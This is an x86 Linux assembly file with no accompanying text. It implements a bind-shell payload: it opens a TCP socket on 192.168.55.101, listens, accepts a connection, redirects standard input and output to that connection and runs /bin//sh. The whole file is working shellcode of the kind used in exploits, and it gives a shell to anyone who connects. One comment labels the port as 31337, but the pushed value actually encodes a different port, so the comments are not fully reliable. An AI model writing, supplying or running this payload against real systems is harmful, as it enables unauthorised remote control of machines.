


global _start
section .text
_start:


;socket()
xor eax,eax
xor ebx,ebx
mov al,0x66
mov bl,0x1
push 0x6    ; protocol
push 0x1    ; sock_stream
push 0x2    ; af_inet
mov ecx,esp
int 0x80


; bind()
mov edx,eax
xor eax,eax
mov al,0x66
push 0x6537a8c0      ; 192.168.55.101
push word 0x0f27     ;31337 port
push word 0x2        ; sin_family_
mov ecx,esp
push 0x10
push ecx
push edx
mov ecx,esp

xor ebx,ebx
mov bl,0x2             ; socketcall() - bind()
int 0x80


; listen()
mov al,0x66            ; socketcall()
mov bl,0x4             ; socketcall() - listen()
xor ecx,ecx
push ecx
push edx
mov ecx,esp
int 0x80


;accept()
xor eax,eax
push eax
push eax
push edx



mov al,0x66
mov bl,0x5
mov ecx,esp
int 0x80


;dup2

mov edx,eax
xor eax,eax
mov al,63
mov ebx,edx
xor ecx,ecx
mov cl,0x2
int 0x80

xor eax,eax
mov al,63
mov ebx,edx
dec ecx
int 0x80

xor eax,eax
mov al,63
mov ebx,edx
dec ecx
int 0x80

xor eax,eax
push eax
push 0x68732f6e
push 0x69622f2f
mov ebx,esp
xor edx,edx
push edx
push ebx
mov ecx,esp
mov al,0xb
int 0x80


